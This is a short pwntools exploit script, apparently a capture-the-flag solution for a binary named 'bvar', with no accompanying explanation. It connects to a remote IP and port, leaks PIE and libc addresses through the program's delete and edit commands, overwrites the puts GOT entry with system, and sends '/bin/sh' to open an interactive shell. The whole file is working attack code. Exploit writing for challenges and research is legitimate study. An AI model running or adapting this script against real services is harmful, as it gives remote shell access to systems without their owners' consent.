from pwn import *

libc = ELF('./libc-2.31.so')
# p = process('./bvar')
# p = remote('167.99.78.201', 7777)
p = remote('35.194.119.116', 7777)

p.sendafter(b'>>> ', b'1=')
p.sendafter(b'>>> ', b'delete\x00' + b'1')

p.sendafter(b'>>> ', b'1=')
p.sendafter(b'>>> ', b'1')

leak = u64(p.recvline().strip().ljust(8, b'\x00'))
log.info('pie_leak: ' + hex(leak))

libc_start_main_got = leak - 0x11c
puts_got = leak - 0x16c

p.sendafter(b'>>> ', b'edit\x00' + b'1')
p.sendline(p64(0))

p.sendafter(b'>>> ', b'delete')

p.sendafter(b'>>> ', b'=' + p64(libc_start_main_got))
p.sendlineafter(b'>>> ', b'')

p.recvuntil(b'>>> ')

libc_leak = u64(p.recvline().strip().ljust(8, b'\x00'))
log.info('libc_leak : ' + hex(libc_leak))

libc.address = libc_leak - libc.sym['__libc_start_main']
log.info('libc_base: ' + hex(libc.address))

system = libc.sym['system']
log.info('system: ' + hex(system))

p.sendafter(b'>>> ', b'delete')
p.sendafter(b'>>> ', b'clear')

p.sendafter(b'>>> ', b'1111' + b'=')
p.sendafter(b'>>> ', b'delete\x00' + b'1111')

p.sendafter(b'>>> ', b'=' + p64(puts_got))
p.sendafter(b'>>> ', b'edit\x00' + p64(libc.address + 0x18b660))

p.send(p64(system)[:5])

p.sendafter(b'>>> ', b'/bin/sh')

p.interactive()
